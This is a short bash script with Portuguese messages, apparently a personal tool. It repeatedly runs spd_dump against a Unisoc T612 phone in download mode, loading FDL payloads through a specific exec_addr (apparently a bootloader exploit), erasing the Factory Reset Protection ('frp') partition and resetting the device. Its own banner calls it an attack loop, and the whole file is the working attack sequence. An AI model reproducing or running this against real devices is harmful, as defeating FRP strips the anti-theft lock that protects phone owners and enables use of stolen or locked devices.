#!/bin/bash
echo "=== INICIANDO LOOP DE ATAQUE AJUSTADO (UNISOC T612) ==="
echo "Procedimento: Segure VOLUME BAIXO e conecte o cabo."
echo "Pressione CTRL+C para parar."
echo ""

while true; do
    # Usando o exec_addr que funcionou anteriormente no seu histórico
    sudo ./spd_dump --wait 1 exec_addr 0x65015f08 fdl fdl1-dl.bin 0x65000800 fdl fdl2-dl.bin 0x9efffe00 exec e frp reset
    
    if [ $? -eq 0 ]; then
        echo ""
        echo "!!! SUCESSO !!!"
        exit 0
    fi
    sleep 0.1
done
